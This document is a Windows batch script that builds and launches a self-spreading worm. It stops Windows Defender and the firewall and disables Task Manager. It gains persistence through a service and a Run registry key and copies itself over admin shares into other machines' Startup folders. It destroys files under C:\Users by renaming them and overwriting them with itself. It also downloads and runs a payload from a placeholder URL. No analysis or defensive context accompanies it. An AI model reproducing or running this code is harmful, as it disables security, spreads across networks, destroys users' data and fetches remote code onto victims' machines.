@echo off

net stop "Windows Defender Service"
net stop "Windows Firewall"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul

echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False >> invisible.vbs

echo @echo off > Worm.bat
echo SET i=0 >> Worm.bat
echo SET "service=NetWorm.bat" >> Worm.bat
echo SET "service=NetWorm" >> Worm.bat

echo echo sc create %service% binpath=%0 > service.bat >> Worm.bat
echo echo sc start %service% >> service.bat >> Worm.bat
echo attrib +h +r +s service.bat >> Worm.bat
echo start service.bat >> Worm.bat

echo reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0 >> Worm.bat
echo attrib +h +r +s %0 >> Worm.bat

echo :Worm >> Worm.bat
echo net use Z: \\192.168.1.%i%\C$ >> Worm.bat
echo if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe" >> Worm.bat
echo mountvol Z: /d) >> Worm.bat
echo if %i% == 256 (goto Infect) else (set /a i=i+1) >> Worm.bat
echo goto Worm >> Worm.bat

echo :Infect >> Worm.bat
echo for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat) >> Worm.bat
echo for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f) >> Worm.bat

echo :payload >> Worm.bat
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('URL HERE', 'Payload.exe')" >> Worm.bat
echo powershell -Command "Invoke-WebRequest <URL HERE> -OutFile Payload.exe" >> Worm.bat
echo start %USERPROFILE%\Downloads\Payload.exe >> Worm.bat

wscript.exe "invisible.vbs" "Worm.bat"
